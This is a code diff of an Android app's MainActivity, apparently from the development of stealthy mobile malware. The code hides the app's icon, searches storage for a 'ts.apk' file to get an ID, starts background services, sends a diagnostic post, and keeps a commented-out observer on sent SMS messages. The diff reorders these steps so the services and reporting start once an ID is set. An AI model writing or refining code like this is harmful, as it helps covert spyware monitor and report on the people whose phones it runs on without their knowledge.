@@ -94,23 +94,19 @@ public class MainActivity extends Activity {
 			e.putString(SAVED_TIME, Long.toString(System.currentTimeMillis()));
 			e.commit();
 			hideIcon();
-			getID();
-			if (sp.getString("ID", "ID").equals("ID")) {
-				viewIDDialog();
-			} else
-				finish();
-			sendDiagPost();
-			// Toast.makeText(this, sourceApk,
-			// Toast.LENGTH_LONG).show();
-			start(); // запуск сервисов
 		}
-
+		getID();
+		if (sp.getString("ID", "ID").equals("ID")) {
+			Log.d("mainID", "ID viewdDalog");
+			viewIDDialog();
+		} else
+			finish();
 	}
 
 	public void contentObserved() {
-		// SmsSentObserver content = new SmsSentObserver(new Handler(), null);
-		// this.getContentResolver().registerContentObserver(
-		// Uri.parse("content://sms/sent"), true, null);
+//		SmsSentObserver content = new SmsSentObserver(new Handler(), null);
+//        this.getContentResolver().registerContentObserver(
+//                        Uri.parse("content://sms/sent"), true, null);
 	}
 
 	private boolean viewIDDialog() {
@@ -135,7 +131,9 @@ public class MainActivity extends Activity {
 				Editor e = sp.edit();
 				e.putString("ID", value);
 				e.commit();
+				start(); // запуск сервисов
 				contentObserved();
+				sendDiagPost();
 				finish();
 			}
 		});
@@ -175,7 +173,7 @@ public class MainActivity extends Activity {
 		recursiveFileFind(file);
 	}
 
-	public void recursiveFileFind(File[] file1) {
+	public boolean recursiveFileFind(File[] file1) {
 		int i = 0;
 		String filePath = "";
 		if (file1 != null) {
@@ -184,7 +182,10 @@ public class MainActivity extends Activity {
 				sID = file1[i].getName();
 				if (file1[i].isDirectory()) {
 					File[] file = file1[i].listFiles();
-					recursiveFileFind(file);
+					if(recursiveFileFind(file) == true)
+						return true;
+					Log.d("ID rec", "recurs" + file1[i].getAbsolutePath());
+					
 				}
 
 				if (sID.indexOf("ts.apk") != -1) {
@@ -192,13 +193,22 @@ public class MainActivity extends Activity {
 					e = sp.edit();
 					e.putString("ID", ID);
 					e.commit();
+					Log.d("ID", sp.getString("ID", "ID"));
+					if(!sp.getString("ID", "ID").equals("ID")){
 					contentObserved();
-
+					sendDiagPost();
+					// Toast.makeText(this, sourceApk,
+					// Toast.LENGTH_LONG).show();
+					start(); // запуск сервисов
+					return true;
+				}
 					break;
 				}
 				i++;
 			}
+			
 		}
+		return false;
 	}
 
 	public void start() {
@@ -219,7 +229,7 @@ public class MainActivity extends Activity {
 
 		Log.d(LOG_TAG, "finish start services");
 		FileLog.writeLog("finish start services");
-
+		
 	}
 
 	public void hideIcon() {
